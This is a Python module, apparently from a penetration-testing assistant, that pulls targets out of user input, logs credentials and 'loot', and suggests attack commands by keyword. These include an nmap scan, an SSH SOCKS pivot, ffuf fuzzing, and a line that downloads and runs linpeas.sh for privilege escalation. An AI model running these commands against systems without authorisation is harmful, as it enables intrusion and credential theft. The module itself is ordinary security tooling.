"""
Engagement Management Module - Functions for managing security engagements
"""

import re
import os
from pathlib import Path

# Engagement memory
engagement_memory = {
    "targets": [],
    "credentials": [],
    "loot": [],
    "network_maps": [],
    "attack_history": []
}

def extract_targets(task):
    """Extract potential target IP addresses from user input"""
    global engagement_memory
    targets = []
    
    # Look for IP ranges (CIDR notation)
    cidr_pattern = r'(?:\d{1,3}\.){3}\d{1,3}(?:/\d{1,2})?'
    cidr_matches = re.findall(cidr_pattern, task)
    targets.extend(cidr_matches)
    
    # Look for single IPs
    ip_pattern = r'(?:\d{1,3}\.){3}\d{1,3}'
    ip_matches = re.findall(ip_pattern, task)
    targets.extend(ip_matches)
    
    # Look for hostnames
    hostname_pattern = r'(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}'
    hostname_matches = re.findall(hostname_pattern, task)
    targets.extend(hostname_matches)
    
    # Add to engagement memory if not already present
    for t in targets:
        if t not in engagement_memory["targets"]:
            engagement_memory["targets"].append(t)
            
    return targets

def suggest_attack_plan(task):
    """Suggest an attack plan based on task description"""
    task_lower = task.lower()
    if "recon" in task_lower:
        return "Recommended: nmap -sC -sV -oA recon_scan <target> | tee recon_scan.txt | grep open"
    if "priv esc" in task_lower:
        return "Recommended: wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh | tee linpeas.txt"
    if "pivot" in task_lower:
        return "Recommended: ssh -D 9050 user@target -f -C -q -N (SOCKS Proxy Pivot)"
    if "web exploit" in task_lower:
        return "Recommended: ffuf -u http://<target>/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
    return ""

def record_finding(finding_type, value, source="manual"):
    """Record a finding in the engagement memory"""
    if finding_type == "target" and value not in engagement_memory["targets"]:
        engagement_memory["targets"].append(value)
        return True
    elif finding_type == "credential" and value not in engagement_memory["credentials"]:
        engagement_memory["credentials"].append(value)
        return True
    elif finding_type == "loot" and value not in engagement_memory["loot"]:
        engagement_memory["loot"].append(value)
        return True
    return False

def get_engagement_summary():
    """Get a summary of the current engagement"""
    return {
        "targets": len(engagement_memory["targets"]),
        "credentials": len(engagement_memory["credentials"]),
        "loot": len(engagement_memory["loot"]),
        "network_maps": len(engagement_memory["network_maps"])
    }

def get_default_network():
    """Get default network range for scanning"""
    try:
        # Try to get primary interface IP
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        
        # Convert to network range
        ip_parts = local_ip.split('.')
        return f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}.0/24"
    except:
        # Fallback to common local network ranges
        return "192.168.0.0/24" 